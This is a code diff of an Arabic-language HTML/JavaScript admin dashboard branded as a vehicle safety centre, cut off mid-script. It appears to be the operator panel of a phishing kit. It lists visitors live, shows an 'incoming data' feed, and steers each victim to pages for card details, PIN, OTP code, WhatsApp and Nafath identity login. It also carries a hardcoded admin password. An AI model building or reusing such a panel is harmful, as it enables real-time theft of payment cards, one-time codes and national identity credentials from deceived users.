@@ -1,173 +1,202 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>مركز سلامة المركبات | لوحة التحكم</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-  <style>
-    *{margin:0;padding:0;box-sizing:border-box}
-    body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f0f4f8;color:#1a1a2e;direction:rtl}
-    #loginPage{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1a2744 0%,#0f1f3d 100%)}
-    .login-card{background:#fff;border-radius:20px;padding:40px 36px;width:360px;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
-    .login-logo{width:60px;height:60px;background:#1a6b4a;border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
-    .login-logo i{color:#fff;font-size:28px}
-    .login-card h2{font-size:20px;font-weight:700;color:#1a1a2e;margin-bottom:4px}
-    .login-card p{font-size:13px;color:#6b7280;margin-bottom:28px}
-    .inp-group{text-align:right;margin-bottom:16px;position:relative}
-    .inp-group label{display:block;font-size:13px;color:#374151;margin-bottom:6px;font-weight:500}
-    .inp-group input{width:100%;border:1.5px solid #d1d5db;border-radius:12px;padding:12px 16px;font-size:14px;color:#1f2937;outline:none;transition:border-color .2s}
-    .inp-group input:focus{border-color:#1a6b4a;box-shadow:0 0 0 3px rgba(26,107,74,.1)}
-    .toggle-pw{position:absolute;left:12px;top:38px;background:none;border:none;cursor:pointer;color:#9ca3af}
-    .err-msg{background:#fef2f2;color:#dc2626;border-radius:8px;padding:10px 14px;font-size:13px;margin-bottom:14px;display:none}
-    .btn-login{width:100%;background:#1a6b4a;color:#fff;border:none;border-radius:12px;padding:13px;font-size:15px;font-weight:600;cursor:pointer;transition:background .2s}
-    .btn-login:hover{background:#155a3d}
-    #adminPanel{display:none;min-height:100vh}
-    .topbar{background:#fff;border-bottom:1px solid #e5e7eb;padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 4px rgba(0,0,0,.06)}
-    .brand{display:flex;align-items:center;gap:10px}
-    .brand-icon{width:36px;height:36px;background:#1a6b4a;border-radius:10px;display:flex;align-items:center;justify-content:center}
-    .brand-icon i{color:#fff;font-size:16px}
-    .brand-name{font-size:15px;font-weight:700;color:#1a1a2e}
-    .brand-sub{font-size:11px;color:#6b7280}
-    .sdot{width:8px;height:8px;border-radius:50%;background:#ef4444;display:inline-block;margin-left:6px}
-    .stext{font-size:12px;color:#6b7280}
-    .btn-logout{background:#ef4444;color:#fff;border:none;border-radius:8px;padding:7px 14px;font-size:13px;cursor:pointer;display:flex;align-items:center;gap:6px}
-    .btn-logout:hover{background:#dc2626}
-    .main{padding:24px;max-width:1400px;margin:0 auto}
-    .stats{display:grid;grid-template-columns:repeat(5,1fr);gap:16px;margin-bottom:24px}
-    .sc{background:#fff;border-radius:14px;padding:18px 20px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6}
-    .sv{font-size:26px;font-weight:700;color:#1a1a2e}
-    .sl{font-size:12px;color:#6b7280;margin-top:2px}
-    .si{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px}
-    .si.g{background:#dcfce7;color:#16a34a}.si.b{background:#dbeafe;color:#2563eb}
-    .si.o{background:#ffedd5;color:#ea580c}.si.p{background:#ede9fe;color:#7c3aed}
-    .si.t{background:#ccfbf1;color:#0d9488}
-    .sbar{background:#fff;border-radius:12px;padding:12px 16px;margin-bottom:16px;display:flex;align-items:center;gap:10px;border:1px solid #e5e7eb;box-shadow:0 1px 3px rgba(0,0,0,.04)}
-    .sbar i{color:#9ca3af;font-size:16px}
-    .sbar input{border:none;outline:none;font-size:14px;color:#374151;flex:1;background:transparent}
-    .tcard{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6}
-    .thead2{padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f3f4f6}
-    .ttitle{font-size:16px;font-weight:700;color:#1a1a2e}
-    .btn-ref{background:#f3f4f6;color:#374151;border:none;border-radius:8px;padding:7px 14px;font-size:13px;cursor:pointer;display:flex;align-items:center;gap:6px}
-    .btn-ref:hover{background:#e5e7eb}
-    table{width:100%;border-collapse:collapse}
-    thead{background:#f9fafb}
-    th{padding:12px 16px;text-align:right;font-size:12px;font-weight:600;color:#6b7280;border-bottom:1px solid #f3f4f6;white-space:nowrap}
-    td{padding:14px 16px;font-size:13px;color:#374151;border-bottom:1px solid #f9fafb;white-space:nowrap}
-    tr:last-child td{border-bottom:none}
-    tr:hover td{background:#fafafa}
-    .badge{display:inline-flex;align-items:center;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600}
-    .bp{background:#fef3c7;color:#d97706}.bc{background:#dcfce7;color:#16a34a}
-    .br{background:#fee2e2;color:#dc2626}.bn{background:#dbeafe;color:#2563eb}
-    .abts{display:flex;gap:6px;align-items:center}
-    .bdet{background:#2563eb;color:#fff;border:none;border-radius:7px;padding:6px 12px;font-size:12px;cursor:pointer;display:flex;align-items:center;gap:4px}
-    .bdet:hover{background:#1d4ed8}
-    .bacc{background:#16a34a;color:#fff;border:none;border-radius:7px;padding:6px 10px;font-size:12px;cursor:pointer}
-    .bacc:hover{background:#15803d}
-    .brej{background:#dc2626;color:#fff;border:none;border-radius:7px;padding:6px 10px;font-size:12px;cursor:pointer}
-    .brej:hover{background:#b91c1c}
-    .empty{text-align:center;padding:60px 20px;color:#9ca3af}
-    .empty i{font-size:40px;margin-bottom:12px;display:block}
-    .empty p{font-size:14px}
-    .moverlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center;z-index:1000}
-    .moverlay.active{display:flex}
-    .modal{background:#fff;border-radius:16px;padding:28px;width:480px;max-width:95vw;max-height:90vh;overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,.2)}
-    .mhdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:16px;border-bottom:1px solid #f3f4f6}
-    .mtitle{font-size:17px;font-weight:700;color:#1a1a2e}
-    .mclose{background:#f3f4f6;border:none;border-radius:8px;width:32px;height:32px;cursor:pointer;font-size:16px;color:#6b7280}
-    .mclose:hover{background:#e5e7eb}
-    .drow{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f9fafb}
-    .drow:last-child{border-bottom:none}
-    .dlbl{font-size:13px;color:#6b7280}.dval{font-size:13px;color:#1f2937;font-weight:500}
-    .macts{display:flex;gap:10px;margin-top:20px}
-    .macts button{flex:1;padding:11px;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer}
-    .macc{background:#16a34a;color:#fff}.macc:hover{background:#15803d}
-    .mrej2{background:#dc2626;color:#fff}.mrej2:hover{background:#b91c1c}
-    .toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1f2937;color:#fff;padding:12px 24px;border-radius:10px;font-size:14px;z-index:9999;display:none;align-items:center;gap:8px;box-shadow:0 4px 20px rgba(0,0,0,.2)}
-    .toast.show{display:flex}.toast.success{background:#16a34a}.toast.error{background:#dc2626}
-    .vgrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;margin-top:16px}
-    .vcard{background:#fff;border-radius:12px;padding:16px;border:1px solid #f3f4f6;box-shadow:0 1px 3px rgba(0,0,0,.05)}
-    .vchdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
-    .vid{font-size:12px;color:#6b7280;font-family:monospace}
-    .vonl{width:8px;height:8px;border-radius:50%;background:#22c55e}
-    .vpg{font-size:14px;font-weight:600;color:#1a1a2e;margin-bottom:4px}
-    .vip{font-size:12px;color:#9ca3af}
-    .vacts{margin-top:12px;display:flex;gap:8px}
-    .nsel{flex:1;border:1px solid #d1d5db;border-radius:8px;padding:7px 10px;font-size:12px;outline:none;color:#374151}
-    .bsnav{background:#7c3aed;color:#fff;border:none;border-radius:8px;padding:7px 12px;font-size:12px;cursor:pointer}
-    .tabs{display:flex;gap:4px;margin-bottom:20px;background:#fff;border-radius:12px;padding:6px;border:1px solid #e5e7eb}
-    .tbtn{flex:1;padding:9px 16px;border:none;border-radius:8px;font-size:13px;font-weight:500;cursor:pointer;color:#6b7280;background:transparent;display:flex;align-items:center;justify-content:center;gap:6px}
-    .tbtn.active{background:#1a6b4a;color:#fff}
-    .tbtn:hover:not(.active){background:#f3f4f6}
-    .tcont{display:none}.tcont.active{display:block}
-    @media(max-width:768px){.stats{grid-template-columns:repeat(2,1fr)}.main{padding:16px}}
-  </style>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>مركز سلامة المركبات | لوحة التحكم</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f0f4f8;color:#1a1a2e;direction:rtl}
+/* LOGIN */
+#loginPage{min-height:100vh;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#1a2744,#0f1f3d)}
+.lcard{background:#fff;border-radius:20px;padding:40px 36px;width:360px;box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
+.llogo{width:60px;height:60px;background:#1a6b4a;border-radius:16px;display:flex;align-items:center;justify-content:center;margin:0 auto 16px}
+.llogo i{color:#fff;font-size:28px}
+.lcard h2{font-size:20px;font-weight:700;margin-bottom:4px}
+.lcard p{font-size:13px;color:#6b7280;margin-bottom:28px}
+.ig{text-align:right;margin-bottom:16px;position:relative}
+.ig label{display:block;font-size:13px;color:#374151;margin-bottom:6px;font-weight:500}
+.ig input{width:100%;border:1.5px solid #d1d5db;border-radius:12px;padding:12px 16px;font-size:14px;outline:none;transition:border-color .2s}
+.ig input:focus{border-color:#1a6b4a;box-shadow:0 0 0 3px rgba(26,107,74,.1)}
+.tpw{position:absolute;left:12px;top:38px;background:none;border:none;cursor:pointer;color:#9ca3af}
+.errmsg{background:#fef2f2;color:#dc2626;border-radius:8px;padding:10px 14px;font-size:13px;margin-bottom:14px;display:none}
+.btnl{width:100%;background:#1a6b4a;color:#fff;border:none;border-radius:12px;padding:13px;font-size:15px;font-weight:600;cursor:pointer}
+.btnl:hover{background:#155a3d}
+/* ADMIN */
+#adminPanel{display:none;min-height:100vh}
+.topbar{background:#fff;border-bottom:1px solid #e5e7eb;padding:0 24px;height:56px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+.brand{display:flex;align-items:center;gap:10px}
+.bicon{width:36px;height:36px;background:#1a6b4a;border-radius:10px;display:flex;align-items:center;justify-content:center}
+.bicon i{color:#fff;font-size:16px}
+.bname{font-size:15px;font-weight:700}
+.bsub{font-size:11px;color:#6b7280}
+.sdot{width:8px;height:8px;border-radius:50%;background:#ef4444;display:inline-block;margin-left:6px}
+.stext{font-size:12px;color:#6b7280}
+.btnout{background:#ef4444;color:#fff;border:none;border-radius:8px;padding:7px 14px;font-size:13px;cursor:pointer;display:flex;align-items:center;gap:6px}
+.btnout:hover{background:#dc2626}
+.main{padding:24px;max-width:1500px;margin:0 auto}
+/* STATS - إجمالي الحجوزات على اليمين، زوار متصلون على اليسار */
+.stats{display:grid;grid-template-columns:repeat(5,1fr);gap:16px;margin-bottom:24px}
+.sc{background:#fff;border-radius:14px;padding:18px 20px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6}
+.sv{font-size:26px;font-weight:700}
+.sl{font-size:12px;color:#6b7280;margin-top:2px}
+.si{width:44px;height:44px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px}
+.si.g{background:#dcfce7;color:#16a34a}.si.b{background:#dbeafe;color:#2563eb}
+.si.o{background:#ffedd5;color:#ea580c}.si.p{background:#ede9fe;color:#7c3aed}
+.si.t{background:#ccfbf1;color:#0d9488}
+/* LAYOUT: جدول + زوار جنباً لجنب */
+.layout{display:grid;grid-template-columns:1fr 340px;gap:20px;align-items:start}
+/* BOOKINGS */
+.tcard{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6}
+.thead2{padding:14px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f3f4f6}
+.ttitle{font-size:15px;font-weight:700}
+.sbar{background:#fff;border-radius:10px;padding:10px 14px;margin-bottom:14px;display:flex;align-items:center;gap:10px;border:1px solid #e5e7eb}
+.sbar i{color:#9ca3af}
+.sbar input{border:none;outline:none;font-size:13px;color:#374151;flex:1;background:transparent}
+.btnref{background:#f3f4f6;color:#374151;border:none;border-radius:8px;padding:7px 12px;font-size:12px;cursor:pointer;display:flex;align-items:center;gap:5px}
+.btnref:hover{background:#e5e7eb}
+table{width:100%;border-collapse:collapse}
+thead{background:#f9fafb}
+th{padding:11px 14px;text-align:right;font-size:11px;font-weight:600;color:#6b7280;border-bottom:1px solid #f3f4f6;white-space:nowrap}
+td{padding:12px 14px;font-size:12px;color:#374151;border-bottom:1px solid #f9fafb;white-space:nowrap}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:#fafafa}
+.badge{display:inline-flex;align-items:center;padding:3px 9px;border-radius:20px;font-size:11px;font-weight:600}
+.bp{background:#fef3c7;color:#d97706}.bc{background:#dcfce7;color:#16a34a}
+.br{background:#fee2e2;color:#dc2626}.bn{background:#dbeafe;color:#2563eb}
+.abts{display:flex;gap:5px;align-items:center}
+.bdet{background:#2563eb;color:#fff;border:none;border-radius:7px;padding:5px 10px;font-size:11px;cursor:pointer;display:flex;align-items:center;gap:3px}
+.bdet:hover{background:#1d4ed8}
+.bacc{background:#16a34a;color:#fff;border:none;border-radius:7px;padding:5px 8px;font-size:11px;cursor:pointer}
+.bacc:hover{background:#15803d}
+.brej{background:#dc2626;color:#fff;border:none;border-radius:7px;padding:5px 8px;font-size:11px;cursor:pointer}
+.brej:hover{background:#b91c1c}
+.empty{text-align:center;padding:50px 20px;color:#9ca3af}
+.empty i{font-size:36px;margin-bottom:10px;display:block}
+/* SIDEBAR: زوار + توجيه */
+.sidebar{display:flex;flex-direction:column;gap:16px}
+.vcard2{background:#fff;border-radius:14px;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6;overflow:hidden}
+.vhdr{padding:14px 16px;border-bottom:1px solid #f3f4f6;display:flex;align-items:center;justify-content:space-between}
+.vtitle{font-size:14px;font-weight:700}
+.vbody{padding:12px}
+.vitem{background:#f9fafb;border-radius:10px;padding:12px;margin-bottom:8px;border:1px solid #f3f4f6}
+.vitem:last-child{margin-bottom:0}
+.virow{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
+.vsid{font-size:11px;color:#6b7280;font-family:monospace}
+.vonl{width:7px;height:7px;border-radius:50%;background:#22c55e}
+.vpg{font-size:13px;font-weight:600;color:#1a1a2e}
+.vip{font-size:11px;color:#9ca3af;margin-bottom:8px}
+.vnav{display:flex;gap:6px;margin-bottom:6px}
+.nsel{flex:1;border:1px solid #d1d5db;border-radius:7px;padding:6px 8px;font-size:11px;outline:none;color:#374151}
+.bsnav{background:#7c3aed;color:#fff;border:none;border-radius:7px;padding:6px 10px;font-size:11px;cursor:pointer}
+.bsnav:hover{background:#6d28d9}
+.vcode{display:flex;gap:6px}
+.cinp{flex:1;border:1px solid #d1d5db;border-radius:7px;padding:6px 8px;font-size:11px;outline:none}
+.bscode{background:#0d9488;color:#fff;border:none;border-radius:7px;padding:6px 10px;font-size:11px;cursor:pointer}
+.bscode:hover{background:#0f766e}
+/* DATA NOTIFICATIONS */
+.ntf{background:#fff;border-radius:14px;box-shadow:0 1px 4px rgba(0,0,0,.06);border:1px solid #f3f4f6;overflow:hidden}
+.ntfhdr{padding:14px 16px;border-bottom:1px solid #f3f4f6;display:flex;align-items:center;justify-content:space-between}
+.ntfbody{max-height:300px;overflow-y:auto;padding:10px}
+.ntfitem{background:#f9fafb;border-radius:8px;padding:10px 12px;margin-bottom:6px;border-right:3px solid #1a6b4a;font-size:12px}
+.ntfitem:last-child{margin-bottom:0}
+.ntftype{font-weight:600;color:#1a6b4a;margin-bottom:3px}
+.ntfip{color:#6b7280;font-size:11px}
+.ntftime{color:#9ca3af;font-size:10px;float:left}
+/* MODAL */
+.moverlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;justify-content:center;z-index:1000}
+.moverlay.active{display:flex}
+.modal{background:#fff;border-radius:16px;padding:28px;width:500px;max-width:95vw;max-height:90vh;overflow-y:auto;box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.mhdr{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:16px;border-bottom:1px solid #f3f4f6}
+.mtitle{font-size:17px;font-weight:700}
+.mclose{background:#f3f4f6;border:none;border-radius:8px;width:32px;height:32px;cursor:pointer;font-size:16px;color:#6b7280}
+.mclose:hover{background:#e5e7eb}
+.drow{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid #f9fafb}
+.drow:last-child{border-bottom:none}
+.dlbl{font-size:13px;color:#6b7280}.dval{font-size:13px;color:#1f2937;font-weight:500}
+.macts{display:flex;gap:10px;margin-top:20px}
+.macts button{flex:1;padding:11px;border:none;border-radius:10px;font-size:14px;font-weight:600;cursor:pointer}
+.macc{background:#16a34a;color:#fff}.macc:hover{background:#15803d}
+.mrej2{background:#dc2626;color:#fff}.mrej2:hover{background:#b91c1c}
+/* TOAST */
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1f2937;color:#fff;padding:12px 24px;border-radius:10px;font-size:14px;z-index:9999;display:none;align-items:center;gap:8px;box-shadow:0 4px 20px rgba(0,0,0,.2)}
+.toast.show{display:flex}.toast.success{background:#16a34a}.toast.error{background:#dc2626}.toast.info{background:#2563eb}
+@media(max-width:1024px){.layout{grid-template-columns:1fr}.stats{grid-template-columns:repeat(3,1fr)}}
+@media(max-width:600px){.stats{grid-template-columns:repeat(2,1fr)}.main{padding:12px}}
+</style>
 </head>
 <body>
 
+<!-- LOGIN -->
 <div id="loginPage">
-  <div class="login-card">
-    <div class="login-logo"><i class="fas fa-car"></i></div>
+  <div class="lcard">
+    <div class="llogo"><i class="fas fa-car"></i></div>
     <h2>مركز سلامة المركبات</h2>
     <p>لوحة التحكم الإدارية</p>
     <form id="loginForm">
-      <div class="inp-group">
+      <div class="ig">
         <label>كلمة المرور</label>
-        <input type="password" id="pwInput" placeholder="أدخل كلمة المرور" />
-        <button type="button" class="toggle-pw" onclick="togglePw()"><i class="fas fa-eye" id="eyeIcon"></i></button>
+        <input type="password" id="pwInput" placeholder="أدخل كلمة المرور"/>
+        <button type="button" class="tpw" onclick="togglePw()"><i class="fas fa-eye" id="eyeIcon"></i></button>
       </div>
-      <div class="err-msg" id="loginErr">كلمة المرور غير صحيحة</div>
-      <button type="submit" class="btn-login"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
+      <div class="errmsg" id="loginErr">كلمة المرور غير صحيحة</div>
+      <button type="submit" class="btnl"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
     </form>
   </div>
 </div>
 
+<!-- ADMIN PANEL -->
 <div id="adminPanel">
   <div class="topbar">
     <div class="brand">
-      <div class="brand-icon"><i class="fas fa-car"></i></div>
-      <div><div class="brand-name">مركز سلامة المركبات</div><div class="brand-sub">لوحة التحكم الإدارية</div></div>
+      <div class="bicon"><i class="fas fa-car"></i></div>
+      <div><div class="bname">مركز سلامة المركبات</div><div class="bsub">لوحة التحكم الإدارية</div></div>
     </div>
     <div style="display:flex;align-items:center;gap:16px">
       <span><span class="sdot" id="sdot"></span><span class="stext" id="stext">جاري الاتصال...</span></span>
-      <button class="btn-logout" onclick="logout()"><i class="fas fa-sign-out-alt"></i> خروج</button>
+      <button class="btnout" onclick="logout()"><i class="fas fa-sign-out-alt"></i> خروج</button>
     </div>
   </div>
   <div class="main">
+    <!-- STATS: إجمالي على اليمين، زوار على اليسار -->
     <div class="stats">
-      <div class="sc"><div><div class="sv" id="s1">0</div><div class="sl">زوار متصلون الآن</div></div><div class="si g"><i class="fas fa-wifi"></i></div></div>
-      <div class="sc"><div><div class="sv" id="s2">0</div><div class="sl">قيد المعالجة</div></div><div class="si o"><i class="fas fa-clock"></i></div></div>
-      <div class="sc"><div><div class="sv" id="s3">0</div><div class="sl">مكتملة</div></div><div class="si b"><i class="fas fa-check-circle"></i></div></div>
-      <div class="sc"><div><div class="sv" id="s4">0</div><div class="sl">حجوزات اليوم</div></div><div class="si p"><i class="fas fa-bell"></i></div></div>
-      <div class="sc"><div><div class="sv" id="s5">0</div><div class="sl">إجمالي الحجوزات</div></div><div class="si t"><i class="fas fa-users"></i></div></div>
+      <div class="sc" style="order:1"><div><div class="sv" id="s5">0</div><div class="sl">إجمالي الحجوزات</div></div><div class="si t"><i class="fas fa-users"></i></div></div>
+      <div class="sc" style="order:2"><div><div class="sv" id="s4">0</div><div class="sl">حجوزات اليوم</div></div><div class="si p"><i class="fas fa-bell"></i></div></div>
+      <div class="sc" style="order:3"><div><div class="sv" id="s3">0</div><div class="sl">مكتملة</div></div><div class="si b"><i class="fas fa-check-circle"></i></div></div>
+      <div class="sc" style="order:4"><div><div class="sv" id="s2">0</div><div class="sl">قيد المعالجة</div></div><div class="si o"><i class="fas fa-clock"></i></div></div>
+      <div class="sc" style="order:5"><div><div class="sv" id="s1">0</div><div class="sl">زوار متصلون الآن</div></div><div class="si g"><i class="fas fa-wifi"></i></div></div>
     </div>
-    <div class="tabs">
-      <button class="tbtn active" onclick="switchTab('bookings',this)"><i class="fas fa-calendar-check"></i> قائمة الحجوزات</button>
-      <button class="tbtn" onclick="switchTab('visitors',this)"><i class="fas fa-eye"></i> الزوار المتصلون</button>
-      <button class="tbtn" onclick="switchTab('navigate',this)"><i class="fas fa-route"></i> التحكم في التوجيه</button>
-    </div>
-    <div id="tab-bookings" class="tcont active">
-      <div class="sbar"><i class="fas fa-search"></i><input type="text" id="srch" placeholder="بحث باسم العميل أو رقم الهاتف أو المنطقة..." oninput="filterTable()" /></div>
-      <div class="tcard">
-        <div class="thead2"><span class="ttitle">قائمة الحجوزات</span><button class="btn-ref" onclick="loadBookings()"><i class="fas fa-sync-alt"></i> تحديث</button></div>
-        <div style="overflow-x:auto"><table><thead><tr><th>#</th><th>الاسم</th><th>رقم الهاتف</th><th>المنطقة</th><th>نوع الخدمة</th><th>التاريخ</th><th>الوقت</th><th>الحالة</th><th>الإجراءات</th></tr></thead><tbody id="btable"><tr><td colspan="9"><div class="empty"><i class="fas fa-inbox"></i><p>جاري التحميل...</p></div></td></tr></tbody></table></div>
+
+    <div class="layout">
+      <!-- BOOKINGS TABLE -->
+      <div>
+        <div class="sbar"><i class="fas fa-search"></i><input type="text" id="srch" placeholder="بحث بالاسم أو الهاتف أو المنطقة..." oninput="filterTable()"/></div>
+        <div class="tcard">
+          <div class="thead2"><span class="ttitle"><i class="fas fa-calendar-check" style="color:#1a6b4a;margin-left:8px"></i>قائمة الحجوزات</span><button class="btnref" onclick="loadBookings()"><i class="fas fa-sync-alt"></i> تحديث</button></div>
+          <div style="overflow-x:auto"><table><thead><tr><th>#</th><th>الاسم</th><th>رقم الهاتف</th><th>المنطقة</th><th>نوع الخدمة</th><th>التاريخ</th><th>الوقت</th><th>الحالة</th><th>الإجراءات</th></tr></thead><tbody id="btable"><tr><td colspan="9"><div class="empty"><i class="fas fa-inbox"></i><p>جاري التحميل...</p></div></td></tr></tbody></table></div>
+        </div>
       </div>
-    </div>
-    <div id="tab-visitors" class="tcont">
-      <div class="tcard" style="padding:20px">
-        <div class="thead2" style="padding:0 0 16px"><span class="ttitle">الزوار المتصلون حالياً</span><button class="btn-ref" onclick="renderVisitors()"><i class="fas fa-sync-alt"></i> تحديث</button></div>
-        <div id="vgrid" class="vgrid"><div class="empty"><i class="fas fa-users"></i><p>لا يوجد زوار متصلون حالياً</p></div></div>
-      </div>
-    </div>
-    <div id="tab-navigate" class="tcont">
-      <div class="tcard" style="padding:24px">
-        <h3 style="font-size:16px;font-weight:700;margin-bottom:20px;color:#1a1a2e">التحكم في توجيه الزوار</h3>
-        <div id="ngrid" class="vgrid"><div class="empty"><i class="fas fa-route"></i><p>لا يوجد زوار متصلون</p></div></div>
+
+      <!-- SIDEBAR -->
+      <div class="sidebar">
+        <!-- DATA NOTIFICATIONS -->
+        <div class="ntf">
+          <div class="ntfhdr"><span class="ttitle"><i class="fas fa-bell" style="color:#ea580c;margin-left:8px"></i>البيانات الواردة</span><button class="btnref" onclick="clearNotifs()"><i class="fas fa-trash"></i></button></div>
+          <div class="ntfbody" id="ntfbody"><div class="empty" style="padding:20px"><i class="fas fa-inbox"></i><p>لا توجد بيانات بعد</p></div></div>
+        </div>
+
+        <!-- VISITORS -->
+        <div class="vcard2">
+          <div class="vhdr"><span class="vtitle"><i class="fas fa-eye" style="color:#2563eb;margin-left:8px"></i>الزوار المتصلون</span><span class="badge bn" id="vcnt">0</span></div>
+          <div class="vbody" id="vbody"><div class="empty" style="padding:20px"><i class="fas fa-users"></i><p>لا يوجد زوار</p></div></div>
+        </div>
       </div>
     </div>
   </div>
 </div>
 
+<!-- MODAL -->
 <div class="moverlay" id="moverlay" onclick="closeMO(event)">
   <div class="modal">
     <div class="mhdr"><span class="mtitle">تفاصيل الحجز</span><button class="mclose" onclick="closeM()">&#10005;</button></div>
@@ -180,154 +209,237 @@
 
 <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 <script>
-const SRV='https://vsafety-server-production.up.railway.app';
-const PASS='Vsafety@2024';
-let socket=null,bookings=[],visitors={};
+const SRV = 'https://vsafety-server-production.up.railway.app';
+const PASS = 'Vsafety@2024';
+const PAGES = [
+  {v:'home',l:'الرئيسية'},
+  {v:'booking',l:'حجز موعد'},
+  {v:'payments',l:'بيانات البطاقة'},
+  {v:'phone',l:'رقم الهاتف'},
+  {v:'pin',l:'رمز التحقق'},
+  {v:'code',l:'كود OTP'},
+  {v:'whats',l:'واتساب'},
+  {v:'nafad',l:'نفاذ'},
+  {v:'success',l:'نجاح'}
+];
 
-document.getElementById('loginForm').addEventListener('submit',function(e){
+let socket = null, bookings = [], visitors = [], notifs = [];
+
+// LOGIN
+document.getElementById('loginForm').addEventListener('submit', function(e) {
   e.preventDefault();
-  if(document.getElementById('pwInput').value===PASS){
-    localStorage.setItem('aa','1');showAdmin();
-  }else{
-    const el=document.getElementById('loginErr');
-    el.style.display='block';
-    setTimeout(function(){el.style.display='none';},3000);
+  if (document.getElementById('pwInput').value === PASS) {
+    localStorage.setItem('aa', '1');
+    showAdmin();
+  } else {
+    var el = document.getElementById('loginErr');
+    el.style.display = 'block';
+    setTimeout(function(){ el.style.display = 'none'; }, 3000);
   }
 });
 
-function togglePw(){
-  const i=document.getElementById('pwInput'),ic=document.getElementById('eyeIcon');
-  i.type=i.type==='password'?'text':'password';
-  ic.className=i.type==='text'?'fas fa-eye-slash':'fas fa-eye';
+function togglePw() {
+  var i = document.getElementById('pwInput'), ic = document.getElementById('eyeIcon');
+  i.type = i.type === 'password' ? 'text' : 'password';
+  ic.className = i.type === 'text' ? 'fas fa-eye-slash' : 'fas fa-eye';
 }
 
-function logout(){
+function logout() {
   localStorage.removeItem('aa');
-  if(socket)socket.disconnect();
-  document.getElementById('adminPanel').style.display='none';
-  document.getElementById('loginPage').style.display='flex';
+  if (socket) socket.disconnect();
+  document.getElementById('adminPanel').style.display = 'none';
+  document.getElementById('loginPage').style.display = 'flex';
 }
 
-function showAdmin(){
-  document.getElementById('loginPage').style.display='none';
-  document.getElementById('adminPanel').style.display='block';
-  initSocket();loadBookings();
+function showAdmin() {
+  document.getElementById('loginPage').style.display = 'none';
+  document.getElementById('adminPanel').style.display = 'block';
+  initSocket();
+  loadBookings();
 }
 
-window.onload=function(){if(localStorage.getItem('aa')==='1')showAdmin();};
+window.onload = function() { if (localStorage.getItem('aa') === '1') showAdmin(); };
 
-function initSocket(){
-  socket=io(SRV,{transports:['websocket','polling']});
-  socket.on('connect',function(){
-    document.getElementById('sdot').style.background='#22c55e';
-    document.getElementById('stext').textContent='متصل';
+function initSocket() {
+  socket = io(SRV, { transports: ['websocket', 'polling'] });
+  socket.on('connect', function() {
+    document.getElementById('sdot').style.background = '#22c55e';
+    document.getElementById('stext').textContent = 'متصل';
     socket.emit('adminJoin');
   });
-  socket.on('disconnect',function(){
-    document.getElementById('sdot').style.background='#ef4444';
-    document.getElementById('stext').textContent='منقطع';
+  socket.on('disconnect', function() {
+    document.getElementById('sdot').style.background = '#ef4444';
+    document.getElementById('stext').textContent = 'منقطع';
   });
-  socket.on('visitorUpdate',function(d){visitors=d;updateVStats();renderVisitors();});
-  socket.on('newBooking',function(b){bookings.unshift(b);renderBookings(bookings);updateStats();showToast('حجز جديد: '+(b.name||'عميل'),'success');});
-  socket.on('bookingUpdated',function(b){const i=bookings.findIndex(function(x){return x.id===b.id;});if(i>=0)bookings[i]=b;renderBookings(bookings);updateStats();});
+  socket.on('visitorUpdate', function(list) {
+    visitors = list || [];
+    document.getElementById('s1').textContent = visitors.length;
+    document.getElementById('vcnt').textContent = visitors.length;
+    renderVisitors();
+  });
+  socket.on('newBooking', function(b) {
+    bookings.unshift(b);
